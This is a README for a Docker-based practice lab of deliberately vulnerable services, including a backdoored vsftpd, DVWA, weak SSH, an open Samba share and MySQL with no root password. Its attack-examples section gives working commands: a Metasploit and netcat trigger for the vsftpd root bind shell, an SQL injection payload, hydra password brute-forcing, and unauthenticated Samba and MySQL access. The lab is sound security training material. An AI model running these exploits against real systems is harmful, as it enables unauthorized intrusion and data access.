# Vulnerability Assessment Lab

A Docker-based hub-and-spoke lab matching the topology in your diagram.

```
        172.16.0.5 (Samba)
             |
172.16.0.6 (MySQL) ── 172.16.0.4 (SSH)
             \       /
             172.16.0.1  ← HUB (pivot / scanner)
             /       \
172.16.0.2 (FTP)  172.16.0.3 (DVWA)
             |
            HOST  ←── you are here
```

---

## Prerequisites

- Docker ≥ 24 and Docker Compose v2
- Linux / macOS host (Windows: use WSL2)

---

## Quick Start

```bash
chmod +x vuln-lab.sh
./vuln-lab.sh up        # pull images + start all containers
./vuln-lab.sh status    # verify IPs and state
./vuln-lab.sh scan      # nmap scan from hub
```

---

## Container Map

| Container  | IP          | Vuln Surface                          | Default Creds              |
|------------|-------------|---------------------------------------|----------------------------|
| hub        | 172.16.0.1  | Central pivot, scanner (nmap inside)  | –                          |
| vulnbox2   | 172.16.0.2  | vsftpd 2.3.4 backdoor (CVE-2011-2523) | anonymous FTP              |
| vulnbox3   | 172.16.0.3  | DVWA – SQLi, XSS, CSRF, RFI, etc.    | admin / password (HTTP :80)|
| vulnbox4   | 172.16.0.4  | SSH weak passwords                    | admin:admin123, root:toor  |
| vulnbox5   | 172.16.0.5  | Samba open share                      | guest:guest                |
| vulnbox6   | 172.16.0.6  | MySQL no-root-password                | root (no password)         |

---

## Connecting from your Host

The Docker bridge network is automatically routed on your host machine.
All containers are directly reachable:

```bash
# Ping the hub
ping 172.16.0.1

# Browse DVWA
open http://172.16.0.3

# MySQL from host
mysql -h 172.16.0.6 -u root

# SSH brute-force target
ssh admin@172.16.0.4   # password: admin123
```

> **Linux note:** If the subnet isn't reachable, add a route:
> `sudo ip route add 172.16.0.0/24 dev docker0`

---

## Scanning from the Hub (pivot workflow)

```bash
./vuln-lab.sh shell hub           # get a shell inside hub
nmap -sV -T4 172.16.0.2-6        # service scan
nmap -sV --script vuln 172.16.0.2 # vuln scripts on vsftpd box
```

---

## Specific Attack Examples

### vsftpd 2.3.4 Backdoor – CVE-2011-2523 (vulnbox2)
The backdoor is triggered by sending a username containing `:)` — vsftpd then
opens a root bind shell on **port 6200**.

```bash
# Option A – Metasploit (easiest)
msfconsole -q -x "use exploit/unix/ftp/vsftpd_234_backdoor; set RHOSTS 172.16.0.2; run"

# Option B – manual trigger
echo -e "USER backdoored:)\nPASS x" | nc 172.16.0.2 21
# Then connect to the shell:
nc 172.16.0.2 6200
```

### DVWA – SQL Injection (vulnbox3)
1. Browse to `http://172.16.0.3`
2. Login: `admin` / `password`
3. Go to SQL Injection, set security to Low
4. Try payload: `' OR 1=1 --`

### SSH Weak Creds (vulnbox4)
```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://172.16.0.4
```

### Samba (vulnbox5)
```bash
smbclient -L //172.16.0.5 -U guest%guest
smbclient //172.16.0.5/public -U guest%guest
```

### MySQL No Auth (vulnbox6)
```bash
mysql -h 172.16.0.6 -u root
SHOW DATABASES;
```

---

## Tear Down

```bash
./vuln-lab.sh down    # stops containers and removes network
```

---

## Legal Notice

This lab is for **authorized security testing and education only**.  
All containers run on a private Docker network isolated from the internet.  
Do not expose these services on a public interface.
